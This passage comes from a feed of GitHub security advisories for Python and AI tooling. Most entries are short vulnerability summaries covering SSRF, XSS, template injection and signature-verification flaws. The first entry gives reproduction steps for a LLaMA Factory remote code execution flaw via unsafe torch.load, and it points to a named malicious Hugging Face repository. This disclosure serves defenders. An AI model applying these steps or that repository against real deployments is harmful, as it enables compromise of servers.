<p>A critical remote code execution vulnerability was discovered during the Llama Factory training process. This vulnerability arises because the <code>vhead_file</code> is loaded without proper safeguards, allowing malicious attackers to execute arbitrary malicious code on the host system simply by passing a malicious <code>Checkpoint path</code> parameter through the <code>WebUI</code> interface. The attack is stealthy, as the victim remains unaware of the exploitation. The root cause is that the <code>vhead_file</code> argument is loaded without the secure parameter <code>weights_only=True</code>.</p>
<p>Note: In torch versions &lt;2.6, the default setting is <code>weights_only=False</code>, and Llama Factory's <code>setup.py</code> only requires <code>torch&gt;=2.0.0</code>.</p>
<h3 id="affected-version">Affected Version</h3>
<p>Llama Factory versions &lt;=0.9.3 are affected by this vulnerability.</p>
<h3 id="details">Details</h3>
<ol>
<li><p>In LLaMA Factory's WebUI, when a user sets the <code>Checkpoint path</code>, it modifies the <code>adapter_name_or_path</code> parameter passed to the training process.
code in src/llamafactory/webui/runner.py</p>
<img src="https://github.com/user-attachments/assets/c8bc79e4-ce7d-43c9-b0fd-e37c235e6585" alt="image-1" width="1040">
</li>
<li><p>The <code>adapter_name_or_path</code> passed to the training process is then used in <code>src/llamafactory/model/model_utils/valuehead.py</code> to fetch the corresponding <code>value_head.bin</code> file from Hugging Face. This file is subsequently loaded via <code>torch.load()</code> without the security parameter <code>weights_only=True</code> being set, resulting in remote code execution.
code in src/llamafactory/model/model_utils/valuehead.py</p>
<img src="https://github.com/user-attachments/assets/6edbe694-0c60-4a54-bfb3-5e1042c9230d" alt="image-2" width="1181"></li>
</ol>
<h3 id="poc">PoC</h3>
<h4 id="steps-to-reproduce">Steps to Reproduce</h4>
<ol>
<li>Deploy llama factory.</li>
<li>Remote attack through the WebUI interface<ol>
<li>Configure <code>Model name</code> and <code>Model path</code>  correctly. For demonstration purposes, we'll use a small model <code>llamafactory/tiny-random-Llama-3</code> to accelerate model loading.</li>
<li>Set <code>Finetuning method</code> to <code>LoRA</code> and <code>Train Stage</code> to <code>Reward Modeling</code>. The vulnerability is specifically triggered during the Reward Modeling training stage.</li>
<li>Input a malicious Hugging Face path in <code>Checkpoint path</code> – here we use <code>paulinsider/llamafactory-hack</code>. This repository(<a href="https://huggingface.co/paulinsider/llamafactory-hack/tree/main">https://huggingface.co/paulinsider/llamafactory-hack/tree/main</a> ) contains a malicious <code>value_head.bin</code> file. The generation method for this file is as follows (it can execute arbitrary attack commands; for demonstration, we configured it to create a <code>HACKED!</code> folder).</li>
<li>Click <code>Start</code> to begin training. After a brief wait, a <code>HACKED!</code> folder will be created on the server. Note that arbitrary malicious code could be executed through this method.</li>
</ol>
</li>
</ol>
<p><strong>The video demonstration of the vulnerability exploitation is available at the</strong> <a href="https://drive.google.com/file/d/1AddKm2mllsXfuvL4Tvbn_WJdjEOYXx4y/view?usp=sharing">Google Drive Link</a> </p>
<h3 id="impact">Impact</h3>
<p>Exploitation of this vulnerability allows remote attackers to:</p>
<ul>
<li>Execute arbitrary malicious code / OS commands on the server.</li>
<li>Potentially compromise sensitive data or escalate privileges.</li>
<li>Deploy malware or create persistent backdoors in the system.
This significantly increases the risk of data breaches and operational disruption.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-xj56-p8mm-qmxj">https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-xj56-p8mm-qmxj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-53002">https://nvd.nist.gov/vuln/detail/CVE-2025-53002</a></li>
<li><a href="https://github.com/hiyouga/LLaMA-Factory/commit/bb7bf51554d4ba8432333c35a5e3b52705955ede">https://github.com/hiyouga/LLaMA-Factory/commit/bb7bf51554d4ba8432333c35a5e3b52705955ede</a></li>
<li><a href="https://github.com/advisories/GHSA-xj56-p8mm-qmxj">https://github.com/advisories/GHSA-xj56-p8mm-qmxj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xj56-p8mm-qmxj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-27T15:27:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langchain-community] LangChain Community SSRF vulnerability exists in RequestsToolkit component ]]></title>
        <id>https://github.com/advisories/GHSA-h5gc-rm8j-5gpr</id>
        <link href="https://github.com/advisories/GHSA-h5gc-rm8j-5gpr"/>
        <updated>2025-06-25T18:45:48.000Z</updated>
        <content type="html"><![CDATA[<p>A Server-Side Request Forgery (SSRF) vulnerability exists in the RequestsToolkit component of the langchain-community package (specifically, langchain_community.agent_toolkits.openapi.toolkit.RequestsToolkit) in langchain-ai/langchain version 0.0.27. This vulnerability occurs because the toolkit does not enforce restrictions on requests to remote internet addresses, allowing it to also access local addresses. As a result, an attacker could exploit this flaw to perform port scans, access local services, retrieve instance metadata from cloud environments (e.g., Azure, AWS), and interact with servers on the local network. This issue has been fixed in version 0.0.28.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-2828">https://nvd.nist.gov/vuln/detail/CVE-2025-2828</a></li>
<li><a href="https://github.com/langchain-ai/langchain/commit/e188d4ecb085d4561a0be3c583d26aa9c2c3283f">https://github.com/langchain-ai/langchain/commit/e188d4ecb085d4561a0be3c583d26aa9c2c3283f</a></li>
<li><a href="https://huntr.com/bounties/8f771040-7f34-420a-b96b-5b93d4a99afc">https://huntr.com/bounties/8f771040-7f34-420a-b96b-5b93d4a99afc</a></li>
<li><a href="https://github.com/advisories/GHSA-h5gc-rm8j-5gpr">https://github.com/advisories/GHSA-h5gc-rm8j-5gpr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h5gc-rm8j-5gpr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-23T21:31:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyspur] pyspur Incomplete Filtering of Special Elements allowed by SingleLLMCallNode function]]></title>
        <id>https://github.com/advisories/GHSA-8gff-cf92-72pv</id>
        <link href="https://github.com/advisories/GHSA-8gff-cf92-72pv"/>
        <updated>2025-06-25T14:12:11.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in PySpur-Dev pyspur up to 0.1.18. It has been classified as critical. Affected is the function SingleLLMCallNode of the file backend/pyspur/nodes/llm/single_llm_call.py of the component Jinja2 Template Handler. The manipulation of the argument user_message leads to improper neutralization of special elements used in a template engine. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-6518">https://nvd.nist.gov/vuln/detail/CVE-2025-6518</a></li>
<li><a href="https://github.com/PySpur-Dev/pyspur/issues/289">https://github.com/PySpur-Dev/pyspur/issues/289</a></li>
<li><a href="https://vuldb.com/?ctiid.313638">https://vuldb.com/?ctiid.313638</a></li>
<li><a href="https://vuldb.com/?id.313638">https://vuldb.com/?id.313638</a></li>
<li><a href="https://vuldb.com/?submit.593612">https://vuldb.com/?submit.593612</a></li>
<li><a href="https://github.com/advisories/GHSA-8gff-cf92-72pv">https://github.com/advisories/GHSA-8gff-cf92-72pv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8gff-cf92-72pv</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-06-23T21:31:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow SSRF via gateway_proxy_handler]]></title>
        <id>https://github.com/advisories/GHSA-wxj7-3fx5-pp9m</id>
        <link href="https://github.com/advisories/GHSA-wxj7-3fx5-pp9m"/>
        <updated>2025-06-27T21:07:20.000Z</updated>
        <content type="html"><![CDATA[<p>gateway_proxy_handler in MLflow before 3.1.0 lacks gateway_path validation.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52967">https://nvd.nist.gov/vuln/detail/CVE-2025-52967</a></li>
<li><a href="https://github.com/mlflow/mlflow/issues/15944">https://github.com/mlflow/mlflow/issues/15944</a></li>
<li><a href="https://github.com/mlflow/mlflow/pull/15970">https://github.com/mlflow/mlflow/pull/15970</a></li>
<li><a href="https://github.com/mlflow/mlflow/releases/tag/v3.1.0">https://github.com/mlflow/mlflow/releases/tag/v3.1.0</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mlflow/PYSEC-2025-52.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mlflow/PYSEC-2025-52.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-wxj7-3fx5-pp9m">https://github.com/advisories/GHSA-wxj7-3fx5-pp9m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wxj7-3fx5-pp9m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-23T15:31:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[changedetection.io] ChangeDetection.io XSS in watch overview]]></title>
        <id>https://github.com/advisories/GHSA-hwpg-x5hw-vpv9</id>
        <link href="https://github.com/advisories/GHSA-hwpg-x5hw-vpv9"/>
        <updated>2025-06-27T23:06:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>XSS - Errors in filters from website page change detection watches were not being filtered.</p>
<h3 id="patches">Patches</h3>
<p>0.50.4</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-hwpg-x5hw-vpv9">https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-hwpg-x5hw-vpv9</a></li>
<li><a href="https://github.com/dgtlmoon/changedetection.io/commit/3d5a544ea674cfce517adcd498877a8d760d0931">https://github.com/dgtlmoon/changedetection.io/commit/3d5a544ea674cfce517adcd498877a8d760d0931</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52558">https://nvd.nist.gov/vuln/detail/CVE-2025-52558</a></li>
<li><a href="https://github.com/advisories/GHSA-hwpg-x5hw-vpv9">https://github.com/advisories/GHSA-hwpg-x5hw-vpv9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hwpg-x5hw-vpv9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-23T21:21:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rfc3161-client] rfc3161-client has insufficient verification for timestamp response signatures]]></title>
        <id>https://github.com/advisories/GHSA-6qhv-4h7r-2g9m</id>
        <link href="https://github.com/advisories/GHSA-6qhv-4h7r-2g9m"/>
        <updated>2025-06-27T22:02:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>rfc3161-client</code> 1.0.2 and earlier contain a flaw in their timestamp response signature verification logic. In particular, it performs chain verification against the TSR's embedded certificates up to the trusted root(s), but fails to verify the TSR's own signature against the timestamping leaf certificates. Consequently, vulnerable versions perform insufficient signature validation to properly consider a TSR verified, as the attacker can introduce <em>any</em> TSR signature so long as the embedded leaf chains up to some root TSA.</p>
<h3 id="patches">Patches</h3>
<p>Users should immediately upgrade to <code>rfc3161-client</code> 1.0.3 or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround possible. Users should immediately upgrade to a fixed version.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/trailofbits/rfc3161-client/security/advisories/GHSA-6qhv-4h7r-2g9m">https://github.com/trailofbits/rfc3161-client/security/advisories/GHSA-6qhv-4h7r-2g9m</a></li>
<li><a href="https://github.com/trailofbits/rfc3161-client/commit/724a184f953e3f171f85cb223871172b41b0d0dc">https://github.com/trailofbits/rfc3161-client/commit/724a184f953e3f171f85cb223871172b41b0d0dc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52556">https://nvd.nist.gov/vuln/detail/CVE-2025-52556</a></li>
<li><a href="https://github.com/advisories/GHSA-6qhv-4h7r-2g9m">https://github.com/advisories/GHSA-6qhv-4h7r-2g9m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6qhv-4h7r-2g9m</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-06-20T18:08:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[urllib3] urllib3 redirects are not disabled when retries are disabled on PoolManager instantiation]]></title>
        <id>https://github.com/advisories/GHSA-pq67-6m6q-mj2v</id>
        <link href="https://github.com/advisories/GHSA-pq67-6m6q-mj2v"/>
        <updated>2025-06-19T15:19:00.000Z</updated>
        <content type="html"><![CDATA[<p>urllib3 handles redirects and retries using the same mechanism, which is controlled by the <code>Retry</code> object. The most common way to disable redirects is at the request level, as follows:</p>
<pre><code class="language-python">resp = urllib3.request("GET", "https://httpbin.org/redirect/1", redirect=False)
print(resp.status)
# 302
</code></pre>
<p>However, it is also possible to disable redirects, for all requests, by instantiating a <code>PoolManager</code> and specifying <code>retries</code> in a way that disable redirects:</p>
<pre><code class="language-python">import urllib3

http = urllib3.PoolManager(retries=0)  # should raise MaxRetryError on redirect
http = urllib3.PoolManager(retries=urllib3.Retry(redirect=0))  # equivalent to the above
http = urllib3.PoolManager(retries=False)  # should return the first response

resp = http.request("GET", "https://httpbin.org/redirect/1")
</code></pre>
<p>However, the <code>retries</code> parameter is currently ignored, which means all the above examples don't disable redirects.</p>
<h2 id="affected-usages">Affected usages</h2>
<p>Passing <code>retries</code> on <code>PoolManager</code> instantiation to disable redirects or restrict their number.</p>
<p>By default, requests and botocore users are not affected.</p>
<h2 id="impact">Impact</h2>
<p>Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects at the PoolManager level will remain vulnerable.</p>
<h2 id="remediation">Remediation</h2>
<p>You can remediate this vulnerability with the following steps:</p>
<ul>
<li>Upgrade to a patched version of urllib3. If your organization would benefit from the continued support of urllib3 1.x, please contact <a href="mailto:sethmichaellarson@gmail.com">sethmichaellarson@gmail.com</a> to discuss sponsorship or contribution opportunities.</li>
<li>Disable redirects at the <code>request()</code> level instead of the <code>PoolManager()</code> level.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/urllib3/urllib3/security/advisories/GHSA-pq67-6m6q-mj2v">https://github.com/urllib3/urllib3/security/advisories/GHSA-pq67-6m6q-mj2v</a></li>
<li><a href="https://github.com/urllib3/urllib3/commit/f05b1329126d5be6de501f9d1e3e36738bc08857">https://github.com/urllib3/urllib3/commit/f05b1329126d5be6de501f9d1e3e36738bc08857</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-50181">https://nvd.nist.gov/vuln/detail/CVE-2025-50181</a></li>
<li><a href="https://github.com/advisories/GHSA-pq67-6m6q-mj2v">https://github.com/advisories/GHSA-pq67-6m6q-mj2v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pq67-6m6q-mj2v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-18T17:50:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vyper] Vyper: reversed order of side effects for some operations]]></title>
        <id>https://github.com/advisories/GHSA-g2xh-c426-v8mf</id>
        <link href="https://github.com/advisories/GHSA-g2xh-c426-v8mf"/>
        <updated>2025-06-18T17:43:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>For the following (probably non-exhaustive) list of expressions, the compiler evaluates the arguments from right to left instead of left to right.</p>
<pre><code>- unsafe_add
- unsafe_sub
- unsafe_mul
- unsafe_div
- pow_mod256
- |, &amp;, ^ (bitwise operators)
- bitwise_or (deprecated)
- bitwise_and (deprecated)
- bitwise_xor (deprecated)
- raw_call
- &lt;, &gt;, &lt;=, &gt;=, ==, !=
- in, not in (when lhs and rhs are enums)
</code></pre>
<p>This behaviour becomes a problem when the evaluation of one of the arguments produces side effects that other arguments depend on. The following expressions can produce side-effect:</p>
<ul>
<li>state modifying external call </li>
<li>state modifying internal call</li>
<li><code>raw_call</code></li>
<li><code>pop()</code> when used on a Dynamic Array stored in the storage</li>
<li><code>create_minimal_proxy_to</code></li>
<li><code>create_copy_of</code></li>
<li><code>create_from_blueprint</code></li>
</ul>
<p>For example:</p>
<pre><code class="language-Vyper">f:uint256

@internal
def side_effect() -&gt; uint256:
    self.f = 12
    return 1

@external
def foo() -&gt; uint256:
    return unsafe_add(self.f,self.side_effect()) # returns 13 instead of 1
</code></pre>
<pre><code class="language-Vyper">a:DynArray[uint256, 12]
@external
def bar() -&gt; bool:
    self.a = [1,2,3]
    return len(self.a) == self.a.pop() # return false instead of true
</code></pre>
<h3 id="patches">Patches</h3>
<p>not yet patched, will address in a future release. tracking in <a href="https://github.com/vyperlang/vyper/issues/3604">https://github.com/vyperlang/vyper/issues/3604</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>When using expressions from the list above, make sure that the arguments of the expression do not produce side effects or, if one does, that no other argument is dependent on those side effects.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/vyperlang/vyper/security/advisories/GHSA-g2xh-c426-v8mf">https://github.com/vyperlang/vyper/security/advisories/GHSA-g2xh-c426-v8mf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-40015">https://nvd.nist.gov/vuln/detail/CVE-2023-40015</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/vyper/PYSEC-2023-167.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/vyper/PYSEC-2023-167.yaml</a></li>
<li><a href="https://github.com/vyperlang/vyper/issues/3604">https://github.com/vyperlang/vyper/issues/3604</a></li>
<li><a href="https://github.com/vyperlang/vyper/issues/4019">https://github.com/vyperlang/vyper/issues/4019</a></li>
<li><a href="https://github.com/vyperlang/vyper/pull/4157">https://github.com/vyperlang/vyper/pull/4157</a></li>
<li><a href="https://github.com/advisories/GHSA-g2xh-c426-v8mf">https://github.com/advisories/GHSA-g2xh-c426-v8mf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g2xh-c426-v8mf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-09-04T16:39:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gradio] Gradio allows credential leakage on Windows]]></title>
        <id>https://github.com/advisories/GHSA-rvfh-h6c7-fc3c</id>
        <link href="https://github.com/advisories/GHSA-rvfh-h6c7-fc3c"/>
        <updated>2025-06-17T22:33:36.000Z</updated>
        <content type="html"><![CDATA[<p>Gradio before 4.20 allows credential leakage on Windows.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34510">https://nvd.nist.gov/vuln/detail/CVE-2024-34510</a></li>
<li><a href="https://github.com/gradio-app/gradio">https://github.com/gradio-app/gradio</a></li>
<li><a href="https://www.gradio.app/changelog#4-20-0">https://www.gradio.app/changelog#4-20-0</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/gradio/PYSEC-2024-255.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/gradio/PYSEC-2024-255.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-rvfh-h6c7-fc3c">https://github.com/advisories/GHSA-rvfh-h6c7-fc3c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rvfh-h6c7-fc3c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-05T21:30:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[torch] PyTorch Improper Resource Shutdown or Release vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-887c-mr87-cxwp</id>
        <link href="https://github.com/advisories/GHSA-887c-mr87-cxwp"/>
        <updated>2025-06-17T22:32:43.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability, which was classified as problematic, was found in PyTorch 2.6.0. Affected is the function torch.nn.functional.ctc_loss of the file aten/src/ATen/native/LossCTC.cpp. The manipulation leads to denial of service. An attack has to be approached locally. The exploit has been disclosed to the public and may be used. The name of the patch is 46fc5d8e360127361211cb237d5f9eef0223e567. It is recommended to apply a patch to fix this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3730">https://nvd.nist.gov/vuln/detail/CVE-2025-3730</a></li>
<li><a href="https://github.com/pytorch/pytorch/issues/150835">https://github.com/pytorch/pytorch/issues/150835</a></li>
<li><a href="https://github.com/pytorch/pytorch/pull/150981">https://github.com/pytorch/pytorch/pull/150981</a></li>
<li><a href="https://vuldb.com/?ctiid.305076">https://vuldb.com/?ctiid.305076</a></li>
<li><a href="https://vuldb.com/?id.305076">https://vuldb.com/?id.305076</a></li>
<li><a href="https://vuldb.com/?submit.553645">https://vuldb.com/?submit.553645</a></li>
<li><a href="https://github.com/pytorch/pytorch/commit/01f226bfb8f2c343f5c614a6bbf685d91160f3af">https://github.com/pytorch/pytorch/commit/01f226bfb8f2c343f5c614a6bbf685d91160f3af</a></li>
<li><a href="https://github.com/timocafe/tewart-pytorch/commit/46fc5d8e360127361211cb237d5f9eef0223e567">https://github.com/timocafe/tewart-pytorch/commit/46fc5d8e360127361211cb237d5f9eef0223e567</a></li>
<li><a href="https://github.com/advisories/GHSA-887c-mr87-cxwp">https://github.com/advisories/GHSA-887c-mr87-cxwp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-887c-mr87-cxwp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-16T21:30:59.000Z</published>
    </entry>
</feed>